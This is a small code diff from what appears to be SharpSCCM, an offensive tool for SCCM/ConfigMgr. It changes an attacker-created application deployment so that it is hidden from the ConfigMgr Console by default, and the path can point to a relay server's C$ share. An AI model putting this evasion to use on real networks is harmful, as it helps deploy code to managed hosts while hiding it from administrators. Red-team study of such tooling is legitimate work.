@@ -32,7 +32,8 @@ namespace SharpSCCM
             string newApplicationName = $"Application_{Guid.NewGuid()}";
             string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
             applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
-            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, true);
+            // Hide from ConfigMgr Console by default
+            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, false);
             NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
             Console.WriteLine("[+] Waiting for new deployment to become available...");
             bool deploymentAvailable = false;
